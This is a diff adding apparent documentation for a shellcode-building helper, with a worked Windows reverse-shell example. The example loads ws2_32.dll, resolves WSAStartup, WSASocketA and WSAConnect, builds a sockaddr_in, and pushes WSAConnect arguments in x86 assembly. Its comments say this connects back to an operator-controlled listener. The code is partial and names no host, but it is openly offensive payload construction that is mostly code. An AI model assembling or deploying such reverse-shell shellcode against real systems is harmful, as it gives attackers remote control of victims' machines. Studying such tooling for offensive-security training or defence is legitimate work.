@@ -1,0 +1,70 @@
+========================================================
+
+load_dll:
+  var.load_library("**.dll)
+
+resolve_symbols_dll:
+  var.find_function(function)
+  ...
+
+create_complex_param_1:
+  var.set_variable_data(var, value)
+  ...
+
+create_complex_param_N:
+  ...
+
+call_function:
+  ...
+  var.push_var_address(some_var_address),         # *name = ptr to v_sockaddr_in
+  var.push_var_value(some_value),                # socket
+  var.call_function(function),
+
+If the function returns a value, the result is in the EAX register
+
+========================================================
+1) define variables for function's address in the stack memory and get the offset
+
+for function_name in (
+    f_term_process,
+    f_create_process,
+    f_wsastartup,
+    f_wsasocketa,
+    f_wsaconnect,
+):
+    var.add(function_name)
+
+2) load the DLL
+
+"   load_ws2_32:                         ",  # load winsock before resolving socket APIs
+var.load_library("ws2_32.dll"),
+
+3) resolve function addresses
+
+"   resolve_symbols_ws2_32:              ",  # resolve the networking APIs used by the reverse shell
+var.find_function(f_wsastartup),
+var.find_function(f_wsasocketa),
+var.find_function(f_wsaconnect),
+
+4) if there are some parameters (strings, structs that must be created before passing the function as a parameter), create them first
+(you can skip this step if there isn't need). you can see set_data_of_sockin is an example
+
+"   set_data_of_sockin:                  ",  # materialize sockaddr_in on the local scratch stack
+var.set_variable_data(v_sockaddr_in, sockin_data),
+
+"   call_wsaconnect:                     ",  # connect the socket back to the operator-controlled listener
+....
+
+5) finally call the function
+
+"   call_wsaconnect:                     ",  # connect the socket back to the operator-controlled listener
+"       xor eax, eax                    ;",
+"       push eax                        ;",  # lpGQOS
+"       push eax                        ;",  # lpSQOS
+"       push eax                        ;",  # lpCalleeData
+"       push eax                        ;",  # lpCallerData
+"       add al, 0x10                    ;",
+"       push eax                        ;",  # namelen = 0x10
+var.push_var_address(v_sockaddr_in),         # *name = ptr to v_sockaddr_in
+var.push_var_value(v_socket),                # socket
+var.call_function(f_wsaconnect),
